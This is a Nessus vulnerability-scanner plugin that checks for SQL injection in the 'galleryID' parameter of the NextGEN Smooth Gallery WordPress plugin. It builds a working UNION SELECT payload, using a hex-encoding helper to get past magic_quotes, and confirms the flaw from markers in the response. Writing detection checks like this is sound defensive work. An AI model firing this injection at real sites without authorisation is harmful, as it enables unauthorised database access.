#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(49118);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2015/09/24 21:17:13 $");

  script_bugtraq_id(42156);
  script_osvdb_id(66863);
  script_xref(name:"EDB-ID", value:"14541");

  script_name(english:"NextGEN Smooth Gallery Plugin for WordPress 'galleryID' Parameter SQL Injection");
  script_summary(english:"Attempts to manipulate the picture title for a picture in a non-existent gallery.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a SQL
injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host is running NextGEN Smooth Gallery, a third-party
gallery viewer plugin for WordPress.

The version of this plugin installed on the remote host fails to
sanitize input to the 'galleryID' parameter before using it in
database queries.

Provided that PHP's 'magic_quotes_gpc' setting is not enabled, an
unauthenticated, remote attacker can leverage this issue to manipulate
database queries, resulting in the disclosure of sensitive
information.");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/08/03");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/09/07");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "NextGEN Smooth Gallery";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "SmoothGallery/scripts/jd.gallery.js"][0] =
    make_list('SmoothGallery', 'destroySlideShow');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# This function converts a string to a concatenation of hex chars so we
# can pass in strings without worrying about PHP's magic_quotes_gpc.
function hexify(str)
{
  local_var hstr, i, l;

  l = strlen(str);
  if (l == 0) return "";

  hstr = "concat(";
  for (i=0; i<l; i++)
    hstr += hex(ord(str[i])) + ",";
  hstr[strlen(hstr)-1] = ")";

  return hstr;
}

# Try to exploit the issue to manipulate information about a non-existent gallery id.
magic1 = SCRIPT_NAME;
magic2 = unixtime();

exploit = "-" + rand() % 1000 + "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11," + magic2 + ",13," + hexify(str:magic1) + ",15,16,17,18 -- " + '"><!-- ';
url = '/wp-content/plugins/nextgen-smooth-gallery/nggSmoothFrame.php?' +
  'galleryID=' + str_replace(find:" ", replace:"%20", string:exploit);

res = http_send_recv3(port:port, method:"GET", item:dir+url, exit_on_fail:TRUE);

if (
  '<h3> '+magic1+'</h3>' >< res[2] &&
  'thumbs/thumbs_'+magic2+'" class=' >< res[2]
)
{
  set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);

  if (report_verbosity > 0)
  {
    report = '\n' +
      'Nessus was able to verify the issue by manipulating the picture title\n' +
      'for a picture in a non-existent gallery id using the following URL :\n' +
      '\n' +
      '  ' + install_url + url + '\n';
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
